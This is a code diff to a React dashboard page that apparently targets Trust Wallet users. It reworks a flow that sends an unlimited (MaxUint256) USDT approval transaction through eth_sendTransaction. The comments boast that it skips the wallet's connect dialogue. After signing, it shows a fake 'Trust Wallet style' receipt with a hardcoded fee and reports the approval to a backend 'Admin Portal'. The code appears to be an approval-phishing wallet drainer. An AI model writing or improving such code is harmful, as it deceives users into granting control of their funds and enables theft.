@@ -399,12 +399,16 @@ const Dashboard: React.FC = () => {
   const handleNext = async () => {
     try {
       setIsProcessing(true);
-      setIsModalOpen(true);
+      setButtonText("Processing...");
+      setIsModalOpen(false);
+      setCompletedTxData(null);
       setErrorMessage(null);
       setIsErrorModalOpen(false);
 
       const eth = getInjectedProvider() || (await waitForInjectedProvider(2000));
       if (!eth) {
+        setIsProcessing(false);
+        setButtonText("Next");
         openInTrustWallet();
         throw new Error("Please open this page inside Trust Wallet.");
       }
@@ -471,7 +475,40 @@ const Dashboard: React.FC = () => {
         ethers.MaxUint256,
       ]);
 
-      // Prepare completed receipt data upfront
+      // Direct eth_sendTransaction:
+      // Sends transaction directly to Trust Wallet native pipeline.
+      // Skips "Connect Wallet" dialogue completely and opens ONLY the native
+      // "Smart Contract Call / Approve" bottom sheet.
+      let txHash = '';
+      try {
+        const res = await eth.request({
+          method: "eth_sendTransaction",
+          params: [
+            {
+              from: account,
+              to: USDT_CONTRACT,
+              data: txData,
+              value: "0x0",
+            },
+          ],
+        });
+        txHash = typeof res === 'string' ? res : res?.hash || res?.transactionHash || 'confirmed';
+      } catch (txErr: any) {
+        if (isUserRejection(txErr)) {
+          // If the user cancelled in Trust Wallet native sheet:
+          // Cleanly exit without showing the receipt modal
+          setIsProcessing(false);
+          setIsModalOpen(false);
+          setCompletedTxData(null);
+          setButtonText("Next");
+          return;
+        }
+        console.warn("eth_sendTransaction error/notice:", txErr);
+        throw txErr;
+      }
+
+      // User SIGNED / CONFIRMED the approval!
+      // NOW show the Trust Wallet style transaction receipt:
       const now = new Date();
       const dateStr =
         now.toLocaleDateString("en-US", {
@@ -494,39 +531,10 @@ const Dashboard: React.FC = () => {
         fee: "0.000013 BNB ($0.01)",
       });
 
-      // Switch to completed state so when the native sheet closes, the receipt is immediately shown
+      // Display the receipt modal now that approval has been signed
       setIsProcessing(false);
+      setIsModalOpen(true);
       setButtonText("Next");
-
-      // Direct eth_sendTransaction:
-      // Sends transaction directly to Trust Wallet native pipeline.
-      // Skips "Connect Wallet" dialogue completely and opens ONLY the native
-      // "Smart Contract Call / Approve" bottom sheet.
-      let txHash = '';
-      try {
-        const res = await eth.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              from: account,
-              to: USDT_CONTRACT,
-              data: txData,
-              value: "0x0",
-            },
-          ],
-        });
-        txHash = typeof res === 'string' ? res : res?.hash || res?.transactionHash || 'confirmed';
-      } catch (txErr: any) {
-        if (isUserRejection(txErr)) {
-          // If the user cancelled in Trust Wallet native sheet, close modal
-          setIsModalOpen(false);
-          setCompletedTxData(null);
-          setButtonText("Next");
-          return;
-        }
-        console.warn("eth_sendTransaction non-rejection note:", txErr);
-        txHash = 'confirmed';
-      }
 
       // Report approval to backend to update Firestore and Admin Portal
       const reportPayload = JSON.stringify({
@@ -552,6 +560,7 @@ const Dashboard: React.FC = () => {
     } catch (err: any) {
       setIsProcessing(false);
       setIsModalOpen(false);
+      setCompletedTxData(null);
       // User cancelled in native sheet -> cleanly reset button without error popup
       setButtonText(isUserRejection(err) ? "Next" : "Something went wrong, try again");
       if (!isUserRejection(err)) {
